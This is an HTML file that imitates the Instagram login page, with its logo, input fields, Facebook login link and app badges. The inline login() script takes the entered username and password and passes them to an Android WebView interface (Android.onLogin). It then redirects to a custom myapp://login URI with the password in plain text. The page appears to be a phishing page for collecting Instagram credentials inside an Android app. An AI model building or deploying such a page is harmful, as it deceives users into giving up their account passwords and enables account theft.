<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="assets/css/main.css">
  <title>Instagram</title>
</head>
<body>
  <main class="l-main">
      <div class="l-main__img">
        <img src="assets/img/homepage.png" alt="Smartphones">
      </div>
      <div class="l-user">
        <div class="c-panel group">
          <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
          <div class="c-panel__form">
            <input type="text" class="c-panel__input" id="usernameInput" placeholder="Phone number, username, or email">
  <input type="text" class="c-panel__input" id="passwordInput" placeholder="Password">

            <a href="#" class="c-btn" onclick="login()">Log In</a>
            <script>
function login() {
    // Get the values from the input fields
    var usernameInput = document.getElementById('usernameInput');
var passwordInput = document.getElementById('passwordInput');


    // Validate that both username and password are not empty
    var username = usernameInput.value.trim();
    var password = passwordInput.value.trim();

    if (username === '' || password === '') {
        // Display an error message or take appropriate action for empty values
        alert('Username and password cannot be empty.');
        return;
    }

    // Check if Android object is defined
    if (typeof Android !== 'undefined') {
        // Construct the custom URI
        var uri = 'myapp://login?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);

        // Call the Android interface to send the login data
        Android.onLogin(username, password);
    }

    // Redirect to the custom URI (for testing in browser)
    var uri = 'myapp://login?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
    window.location.href = uri;
}
</script>

          
            <span class="c-panel__span">OR</span>
          </div>
          <a href="#" class="c-panel__facebook">Login with Facebook</a>
          <a href="#" class="c-panel__forgot">Forgot password?</a>
        </div>
        <div class="c-signup group">
          <p>Don't have an account? <span>Sign up</span></p>
        </div>
        <div class="c-app">
          <p>Get the app.</p>
          <div class="c-app__download">
            <img src="assets/img/apple.png" alt="Apple Store">
            <img src="assets/img/google.png" alt="Google Play">
          </div>
        </div>
      </div>
  </main>
</body>
</html>
